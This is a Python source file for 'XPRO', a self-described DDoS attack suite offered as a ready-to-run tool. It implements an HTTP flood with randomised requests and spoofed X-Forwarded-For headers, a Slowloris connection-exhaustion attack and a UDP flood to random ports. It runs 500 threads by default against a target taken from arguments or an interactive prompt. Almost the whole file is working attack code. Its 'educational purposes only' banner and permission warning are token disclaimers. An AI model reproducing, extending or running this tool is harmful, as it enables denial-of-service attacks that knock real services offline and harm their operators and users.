#!/usr/bin/env python3
"""
██╗  ██╗██████╗ ██████╗  ██████╗ 
╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗
 ╚███╔╝ ██████╔╝██████╔╝██║   ██║
 ██╔██╗ ██╔═══╝ ██╔══██╗██║   ██║
██╔╝ ██╗██║     ██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
XPRO - Advanced DDoS Attack Suite v3.0
Author: Security Research Team
"""

import os
import sys
import time
import random
import socket
import threading
import ssl
import argparse
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

class XPROBanner:
    @staticmethod
    def show():
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                              ║
{Fore.RED}║  {Fore.CYAN}██╗  ██╗{Fore.YELLOW}██████╗ {Fore.GREEN}█████╗  {Fore.MAGENTA}██████╗  {Fore.WHITE}██████╗  {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}╚██╗██╔╝{Fore.YELLOW}██╔══██╗{Fore.GREEN}██╔══██╗{Fore.MAGENTA}██╔═══██╗{Fore.WHITE}██╔══██╗ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN} ╚███╔╝ {Fore.YELLOW}██████╔╝{Fore.GREEN}███████║{Fore.MAGENTA}██║   ██║{Fore.WHITE}██████╔╝ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN} ██╔██╗ {Fore.YELLOW}██╔═══╝ {Fore.GREEN}██╔══██║{Fore.MAGENTA}██║   ██║{Fore.WHITE}██╔══██╗ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}██╔╝ ██╗{Fore.YELLOW}██║     {Fore.GREEN}██║  ██║{Fore.MAGENTA}╚██████╔╝{Fore.WHITE}██║  ██║ {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}╚═╝  ╚═╝{Fore.YELLOW}╚═╝     {Fore.GREEN}╚═╝  ╚═╝{Fore.MAGENTA} ╚═════╝ {Fore.WHITE}╚═╝  ╚═╝ {Fore.RED}║
{Fore.RED}║                                                              ║
{Fore.RED}║    {Fore.WHITE}Advanced DDoS Attack Suite v3.0 - Professional Grade    {Fore.RED}║
{Fore.RED}║    {Fore.YELLOW}For Educational & Research Purposes Only              {Fore.RED}║
{Fore.RED}╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)

class XPROAttack:
    def __init__(self, target, port=80, threads=500, attack_time=60):
        self.target = target
        self.port = port
        self.threads = threads
        self.attack_time = attack_time
        self.attack_running = False
        self.stats = {
            'requests_sent': 0,
            'connections_made': 0,
            'errors': 0,
            'start_time': 0
        }
        
        # Load user agents
        self.user_agents = self.load_user_agents()
        
    def load_user_agents(self):
        """Load user agents from file or use defaults"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
        return agents
    
    def generate_http_payload(self):
        """Generate random HTTP request"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        paths = ['/', '/wp-admin', '/api/v1', '/login', '/search', '/product', '/admin', '/dashboard']
        params = ['?id=', '?search=', '?page=', '?q=', '?category=', '?user=', '?token=']
        
        method = random.choice(methods)
        path = random.choice(paths)
        param = random.choice(params) + str(random.randint(1, 99999))
        
        # Build HTTP request
        request = f"{method} {path}{param} HTTP/1.1\r\n"
        request += f"Host: {self.target}\r\n"
        request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate, br\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Upgrade-Insecure-Requests: 1\r\n"
        request += "Cache-Control: max-age=0\r\n"
        
        # Add random headers
        if random.choice([True, False]):
            request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        
        if method == 'POST':
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            content_length = random.randint(100, 5000)
            request += f"Content-Length: {content_length}\r\n"
            request += "\r\n"
            request += 'data=' + 'A' * content_length
        else:
            request += "\r\n"
        
        return request.encode()
    
    def http_flood_attack(self):
        """HTTP Flood Attack - Layer 7"""
        while self.attack_running:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                # Connect
                sock.connect((self.target, self.port))
                self.stats['connections_made'] += 1
                
                # Send multiple requests per connection
                for _ in range(random.randint(5, 20)):
                    try:
                        sock.send(self.generate_http_payload())
                        self.stats['requests_sent'] += 1
                        time.sleep(random.uniform(0.01, 0.1))
                    except:
                        self.stats['errors'] += 1
                        break
                
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.1)
    
    def slowloris_attack(self):
        """Slowloris Attack - Keep connections open"""
        sockets_list = []
        
        while self.attack_running:
            try:
                # Create new sockets if needed
                while len(sockets_list) < 200 and self.attack_running:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((self.target, self.port))
                        
                        # Send partial request
                        sock.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {self.target}\r\n".encode())
                        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                        sock.send("Accept: text/html,application/xhtml+xml\r\n".encode())
                        sock.send("X-a: ".encode())
                        
                        sockets_list.append(sock)
                        self.stats['connections_made'] += 1
                    except:
                        pass
                
                # Keep connections alive
                for sock in sockets_list[:]:
                    try:
                        sock.send(f"X-b: {random.randint(1, 5000)}\r\n".encode())
                    except:
                        sockets_list.remove(sock)
                        self.stats['errors'] += 1
                
                time.sleep(15)
                
            except:
                pass
    
    def udp_flood_attack(self):
        """UDP Flood Attack - Layer 4"""
        while self.attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate random data
                data = random._urandom(1024)
                
                # Send to random ports
                for _ in range(random.randint(10, 50)):
                    port = random.randint(1, 65535)
                    sock.sendto(data, (self.target, port))
                    self.stats['requests_sent'] += 1
                
                sock.close()
                
            except:
                self.stats['errors'] += 1
    
    def show_stats(self):
        """Display attack statistics"""
        while self.attack_running:
            elapsed = time.time() - self.stats['start_time']
            print(f"\r{Fore.CYAN}[STATS]{Style.RESET_ALL} Time: {elapsed:.1f}s | "
                  f"Requests: {self.stats['requests_sent']} | "
                  f"Connections: {self.stats['connections_made']} | "
                  f"Errors: {self.stats['errors']}", end='', flush=True)
            time.sleep(1)
    
    def start_attack(self, attack_type='http'):
        """Start the selected attack"""
        self.attack_running = True
        self.stats['start_time'] = time.time()
        
        print(f"{Fore.GREEN}[+] Starting {attack_type.upper()} attack on {self.target}:{self.port}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[+] Threads: {self.threads} | Duration: {self.attack_time}s{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}[+] Press Ctrl+C to stop attack{Style.RESET_ALL}\n")
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.show_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start attack threads
        threads = []
        
        for i in range(self.threads):
            if attack_type == 'http':
                thread = threading.Thread(target=self.http_flood_attack)
            elif attack_type == 'slowloris':
                thread = threading.Thread(target=self.slowloris_attack)
            elif attack_type == 'udp':
                thread = threading.Thread(target=self.udp_flood_attack)
            else:
                thread = threading.Thread(target=self.http_flood_attack)
            
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Run for specified time
        try:
            time.sleep(self.attack_time)
            self.attack_running = False
            print(f"\n\n{Fore.GREEN}[+] Attack completed successfully!{Style.RESET_ALL}")
        except KeyboardInterrupt:
            self.attack_running = False
            print(f"\n\n{Fore.YELLOW}[!] Attack stopped by user{Style.RESET_ALL}")
        
        # Wait for threads to finish
        time.sleep(2)
        
        # Final stats
        print(f"\n{Fore.CYAN}══════════════════════════════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Final Statistics:{Style.RESET_ALL}")
        print(f"  Total Attack Time: {time.time() - self.stats['start_time']:.1f}s")
        print(f"  Requests Sent: {self.stats['requests_sent']}")
        print(f"  Connections Made: {self.stats['connections_made']}")
        print(f"  Errors: {self.stats['errors']}")
        print(f"{Fore.CYAN}══════════════════════════════════════════════════════════════{Style.RESET_ALL}")

def main():
    # Show banner
    XPROBanner.show()
    
    # Parse arguments
    parser = argparse.ArgumentParser(description='XPRO - Advanced DDoS Attack Suite')
    parser.add_argument('-t', '--target', help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-m', '--method', choices=['http', 'slowloris', 'udp'], 
                       default='http', help='Attack method (default: http)')
    parser.add_argument('-th', '--threads', type=int, default=500, 
                       help='Number of threads (default: 500)')
    parser.add_argument('-d', '--duration', type=int, default=60, 
                       help='Attack duration in seconds (default: 60)')
    
    args = parser.parse_args()
    
    # If no target provided, ask interactively
    if not args.target:
        print(f"{Fore.YELLOW}[?] Enter target IP/Domain: {Style.RESET_ALL}", end='')
        args.target = input().strip()
        
        print(f"{Fore.YELLOW}[?] Enter target port (default 80): {Style.RESET_ALL}", end='')
        port_input = input().strip()
        if port_input:
            args.port = int(port_input)
        
        print(f"{Fore.YELLOW}[?] Attack method (http/slowloris/udp) [http]: {Style.RESET_ALL}", end='')
        method_input = input().strip().lower()
        if method_input in ['http', 'slowloris', 'udp']:
            args.method = method_input
        
        print(f"{Fore.YELLOW}[?] Number of threads [500]: {Style.RESET_ALL}", end='')
        threads_input = input().strip()
        if threads_input:
            args.threads = int(threads_input)
        
        print(f"{Fore.YELLOW}[?] Attack duration in seconds [60]: {Style.RESET_ALL}", end='')
        duration_input = input().strip()
        if duration_input:
            args.duration = int(duration_input)
    
    # Validate target
    if not args.target:
        print(f"{Fore.RED}[!] Error: Target is required{Style.RESET_ALL}")
        sys.exit(1)
    
    # Resolve domain to IP if needed
    try:
        target_ip = socket.gethostbyname(args.target)
        print(f"{Fore.GREEN}[+] Target resolved: {args.target} -> {target_ip}{Style.RESET_ALL}")
    except:
        print(f"{Fore.YELLOW}[!] Could not resolve domain, using as-is{Style.RESET_ALL}")
        target_ip = args.target
    
    # Warning message
    print(f"\n{Fore.RED}⚠️  WARNING: This tool is for educational purposes only!{Style.RESET_ALL}")
    print(f"{Fore.RED}⚠️  Use only on systems you own or have permission to test.{Style.RESET_ALL}")
    
    # Confirm attack
    print(f"\n{Fore.YELLOW}[?] Start attack on {args.target}:{args.port}? (y/n): {Style.RESET_ALL}", end='')
    confirm = input().strip().lower()
    
    if confirm != 'y':
        print(f"{Fore.YELLOW}[!] Attack cancelled{Style.RESET_ALL}")
        sys.exit(0)
    
    # Start attack
    try:
        attack = XPROAttack(target_ip, args.port, args.threads, args.duration)
        attack.start_attack(args.method)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program terminated by user{Style.RESET_ALL}")
        sys.exit(0)
